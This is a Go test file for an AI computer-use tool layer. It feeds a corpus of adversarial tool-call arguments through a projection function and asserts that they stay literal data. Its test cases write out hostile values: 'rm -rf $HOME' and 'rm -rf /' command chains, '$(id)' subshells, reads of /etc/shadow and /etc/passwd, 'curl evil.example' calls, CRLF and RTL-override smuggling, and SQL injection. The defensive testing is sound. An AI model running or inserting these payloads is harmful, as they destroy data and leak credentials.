// SPDX-License-Identifier: FSL-1.1-Apache-2.0
// Copyright (c) 2025 Open Computer Use Contributors

// Deterministic red-team injection corpus for the tool-call projection boundary
// (Wave 2, ADR-0026 render-boundary). It feeds adversarial tool-call arguments
// through the REAL projection.Project code and asserts the injection-safe end
// state: a file-tool path never lands in the argv (no argv is built by
// interpolating a caller string), a shell-metacharacter / CRLF / control-char /
// oversized path stays LITERAL inside the opaque stdin payload, and no attacker
// input can turn a fixed-script argv into a command vector it controls.
//
// This is a NATIVE Go harness (no promptfoo, zero new deps): it runs under the
// existing "go test ./..." job. The falsifiable keystone is
// TestInjectionCorpusMetacharPathStaysLiteral: a create_file whose path is
// `a'; rm -rf $HOME; echo x.txt` must project to that LITERAL path carried on
// stdin, with the payload appearing in NO argv element. Neutering Project to
// interpolate the path into an argv reds this immediately.
package projection

import (
	"encoding/json"
	"strings"
	"testing"
)

// injectionCase is one adversarial tool-call: the file-tool name, the raw
// arguments JSON (already the on-wire bytes the ingress hands Project), and the
// exact attacker-controlled substring that MUST NOT surface in any argv element.
// The substring is the payload a shell/exec would act on if the projection ever
// interpolated the path into the command vector instead of keeping it opaque.
type injectionCase struct {
	name    string // human label for the failure message
	tool    string // create_file | str_replace | view
	args    string // raw arguments JSON as the ingress passes it
	payload string // attacker substring that must stay OUT of argv, literal in stdin
}

// injectionCorpus is the deterministic adversarial set. Every entry carries a
// path (or old_str/new_str) engineered to break out of an argument if the
// projection ever built an argv by string interpolation. The classes:
//
//   - shell metacharacters: quote-break + command chaining + $HOME expansion
//   - argv breakout: a leading "-" / "--" flag-looking path, a ";"/"&&" chain
//   - CRLF and control chars: newline/CR/NUL/tab/ESC in the path
//   - Unicode / RTL-override smuggle: bidi override + zero-width joiner
//     (encoded as \u JSON escapes so the source stays ASCII while the DECODED
//     path carries the real adversarial code points)
//   - oversized: a 128 KiB path (must still ride opaque, never be split into argv)
var injectionCorpus = []injectionCase{
	{
		name:    "quote-break-command-chain",
		tool:    "create_file",
		args:    `{"path":"a'; rm -rf $HOME; echo x.txt","file_text":"pwn"}`,
		payload: "a'; rm -rf $HOME; echo x.txt",
	},
	{
		// Interpreted string literal (not a raw literal) so the embedded backtick
		// and JSON-escaped double quotes stay ASCII in the source while the DECODED
		// path carries the real $(...) and backtick subshell metacharacters.
		name:    "double-quote-and-backtick-subshell",
		tool:    "create_file",
		args:    "{\"path\":\"\\\"$(id)\\\"`whoami`.txt\",\"file_text\":\"x\"}",
		payload: "$(id)",
	},
	{
		name:    "leading-dash-flag-breakout",
		tool:    "view",
		args:    `{"path":"--/etc/shadow"}`,
		payload: "--/etc/shadow",
	},
	{
		name:    "semicolon-and-ampersand-chain",
		tool:    "view",
		args:    `{"path":"/tmp/x; cat /etc/passwd && curl evil.example"}`,
		payload: "cat /etc/passwd",
	},
	{
		name:    "crlf-header-style-injection",
		tool:    "create_file",
		args:    `{"path":"ok.txt\r\nX-Injected: 1\r\n","file_text":"x"}`,
		payload: "X-Injected: 1",
	},
	{
		name:    "embedded-newline-argv-split-attempt",
		tool:    "str_replace",
		args:    `{"path":"a.txt\n/bin/sh","old_str":"x","new_str":"y"}`,
		payload: "/bin/sh",
	},
	{
		name:    "nul-and-tab-controls",
		tool:    "create_file",
		args:    `{"path":"a\u0000b\tcd.txt","file_text":"x"}`,
		payload: "cd.txt",
	},
	{
		// The RTL override (U+202E) and zero-width joiner (U+200D) are written as
		// JSON \u escapes so the SOURCE is ASCII, but the path the guest receives
		// (after json.loads) carries the real bidi-override code point that would
		// visually reverse a filename. The payload is that decoded code point.
		name:    "rtl-override-and-zero-width-smuggle",
		tool:    "view",
		args:    `{"path":"safe\u202egpj.\u200dexe"}`,
		payload: "\u202e", // decoded to U+202E at test time via unquoteRTL
	},
	{
		name:    "str-replace-payload-in-old-and-new",
		tool:    "str_replace",
		args:    `{"path":"/etc/hosts","old_str":"'; DROP TABLE t; --","new_str":"$(reboot)"}`,
		payload: "DROP TABLE t",
	},
}

// TestInjectionCorpusMetacharPathStaysLiteral is the falsifiable keystone. For
// EVERY adversarial file-tool call, the projection must:
//
//  1. build the FIXED interpreter argv (exactly [InterpreterPath, "-c", <script>])
//     so the caller's path is NEVER an argv element - there is no argv position
//     an attacker string can occupy;
//  2. carry the whole arguments JSON VERBATIM on stdin, so the metachar/control
//     path survives byte-for-byte as DATA the fixed script parses inside the
//     guest - quotes, ";", "$HOME", CRLF, NUL cannot break out of an argument.
//
// The decisive assertion: the attacker payload appears in NO argv element and
// the stdin equals the input bytes exactly. Neutering Project to interpolate the
// path into the argv (see the red-probe in the front) makes the argv assertion
// fire on the very first case.
func TestInjectionCorpusMetacharPathStaysLiteral(t *testing.T) {
	for _, tc := range injectionCorpus {
		t.Run(tc.name, func(t *testing.T) {
			argv, stdin := Project(tc.tool, []byte(tc.args))

			// (1) The argv is the fixed interpreter invocation. Exactly three
			// elements, and elements 0/1 are the interpreter and -c. Nothing the
			// caller supplied reaches argv[0] (the executable) or the flags.
			if len(argv) != 3 {
				t.Fatalf("%s: file-tool argv must be the fixed 3-element interpreter invocation, got %d elements: %v", tc.tool, len(argv), argv)
			}
			if argv[0] != InterpreterPath || argv[1] != "-c" {
				t.Fatalf("%s: argv[0]/argv[1] must be the fixed interpreter %q -c, got %q %q", tc.tool, InterpreterPath, argv[0], argv[1])
			}
			// (2) argv[2] is the COMMITTED script, byte-identical to the map entry.
			// A projection that spliced the path into the script would diverge here.
			if argv[2] != FileToolScripts[tc.tool] {
				t.Fatalf("%s: argv[2] must be the committed script (no caller interpolation into the command)", tc.tool)
			}

			// (3) THE KEYSTONE: the attacker payload must live in NO argv element.
			// If any argv position carries the metachar/control/breakout substring,
			// the projection interpolated caller data into the command vector - the
			// exact injection this boundary forbids.
			for i, a := range argv {
				if strings.Contains(a, tc.payload) {
					t.Fatalf("INJECTION ESCAPE: attacker payload %q leaked into argv[%d]=%q; the path must never be interpolated into the command vector", tc.payload, i, a)
				}
			}

			// (4) The path rides opaque: stdin is the arguments bytes VERBATIM, so
			// the payload survives literal as DATA (the fixed guest script parses it
			// with json.loads - quotes/";"/NUL/CRLF cannot break out of an argument).
			if string(stdin) != tc.args {
				t.Fatalf("%s: stdin must be the arguments verbatim (opaque relay).\n got: %q\nwant: %q", tc.tool, stdin, tc.args)
			}
			// And the payload IS present in that opaque stdin - proving the path was
			// carried, not dropped or mangled. A projection that stripped the path
			// would be safe-but-wrong; this pins that the literal path is preserved.
			if !payloadPresentInStdin(t, stdin, tc.tool, tc.payload) {
				t.Fatalf("%s: the literal attacker path must be PRESERVED in the opaque stdin, not dropped/re-encoded; payload %q not found in decoded args", tc.tool, tc.payload)
			}
		})
	}
}

// payloadPresentInStdin decodes the opaque stdin back into the arguments object
// and confirms the attacker payload is preserved LITERAL in the path (or the
// str_replace old/new fields). This proves the projection relayed the caller's
// exact bytes as parseable data - the guest sees the literal path, never an
// interpolated command. For the control-character cases the raw substring is
// matched against the decoded string value.
func payloadPresentInStdin(t *testing.T, stdin []byte, tool, payload string) bool {
	t.Helper()
	var obj map[string]any
	if err := json.Unmarshal(stdin, &obj); err != nil {
		t.Fatalf("opaque stdin must be valid JSON the guest script can json.loads, got %v", err)
	}
	fields := []string{"path"}
	if tool == "str_replace" {
		fields = append(fields, "old_str", "new_str")
	}
	for _, f := range fields {
		if s, ok := obj[f].(string); ok && strings.Contains(s, payload) {
			return true
		}
	}
	return false
}

// TestInjectionCorpusOversizedPathRidesOpaque pins that even a pathological
// oversized path (128 KiB) rides on the opaque stdin and never becomes an argv
// element. A projection that interpolated the path would balloon the argv (and,
// through /bin/sh -c, could smuggle chained commands); the opaque relay keeps the
// argv fixed regardless of caller-string size.
func TestInjectionCorpusOversizedPathRidesOpaque(t *testing.T) {
	huge := strings.Repeat("A", 128<<10) + "'; rm -rf /; echo .txt"
	args, err := json.Marshal(map[string]string{"path": huge, "file_text": "x"})
	if err != nil {
		t.Fatalf("marshal oversized case: %v", err)
	}
	argv, stdin := Project("create_file", args)
	if len(argv) != 3 || argv[0] != InterpreterPath || argv[1] != "-c" || argv[2] != CreateFileScript {
		t.Fatalf("oversized path must not change the fixed argv, got %v", argv)
	}
	for i, a := range argv {
		if strings.Contains(a, "rm -rf /") {
			t.Fatalf("INJECTION ESCAPE: oversized-path payload leaked into argv[%d]", i)
		}
	}
	if string(stdin) != string(args) {
		t.Fatalf("oversized path must ride opaque on stdin verbatim")
	}
}

// TestInjectionCorpusUnknownFieldSmuggleHasNoProjection pins that an off-surface
// tool name a caller sends directly gets NO projection (nil argv, nil stdin) -
// the create-only path. An attacker cannot introduce a new executable by naming
// an unknown tool, nor smuggle argv through a name the projection does not know.
// The strict profile decoder rejects unknown fields on the request envelope
// before Project runs; this pins the projection's own fail-closed default.
func TestInjectionCorpusUnknownFieldSmuggleHasNoProjection(t *testing.T) {
	cases := []struct {
		name string
		args string
	}{
		{"unknown-tool-with-argv-lookalike", `{"argv":["/bin/sh","-c","evil"],"command":"evil"}`},
		{"unknown-tool-with-path", `{"path":"/etc/shadow"}`},
		{"exec-tool-name-attempt", `{"cmd":"rm -rf /"}`},
	}
	for _, name := range []string{"exec", "run", "shell", "sub_agent", "not_a_tool"} {
		for _, tc := range cases {
			argv, stdin := Project(name, []byte(tc.args))
			if argv != nil || stdin != nil {
				t.Fatalf("off-surface tool %q with %s must have NO projection (create-only), got argv=%v stdin=%q", name, tc.name, argv, stdin)
			}
		}
	}
}

// TestInjectionCorpusBashCommandIsSingleArgvElement pins the bash_tool contract
// boundary: the command is the tool's DESIGNED input and DOES run through the
// POSIX shell, but it must land as a SINGLE argv element (argv[2]) under a FIXED
// [/bin/sh -c ...] head - never split by embedded metacharacters into extra
// argv elements, and never able to displace argv[0] (the executable) or the -c
// flag. This is the line the corpus draws: bash_tool's command is data-in-argv
// for /bin/sh to parse, not a way to control the exec vector's shape.
func TestInjectionCorpusBashCommandIsSingleArgvElement(t *testing.T) {
	adversarial := []string{
		"echo hi; rm -rf $HOME",
		"a\nb\nc",
		"$(curl evil.example)",
		"`id`",
		"x\x00y",
	}
	for _, cmd := range adversarial {
		args, err := json.Marshal(map[string]string{"command": cmd})
		if err != nil {
			t.Fatalf("marshal bash case: %v", err)
		}
		argv, stdin := Project("bash_tool", args)
		if len(argv) != 3 {
			t.Fatalf("bash_tool must project to exactly [/bin/sh -c <cmd>], got %d elements for %q: %v", len(argv), cmd, argv)
		}
		if argv[0] != "/bin/sh" || argv[1] != "-c" {
			t.Fatalf("bash_tool head must be the fixed /bin/sh -c, got %q %q for %q", argv[0], argv[1], cmd)
		}
		// The WHOLE command is argv[2] and ONLY argv[2] - the shell metacharacters
		// stay inside that one element for /bin/sh to parse; they do not spill into
		// additional argv positions or displace the fixed head.
		if argv[2] != cmd {
			t.Fatalf("bash_tool command must be a single argv element carried verbatim, got %q for input %q", argv[2], cmd)
		}
		if len(stdin) != 0 {
			t.Fatalf("bash_tool carries its command in argv, not stdin; got stdin %q", stdin)
		}
	}
}
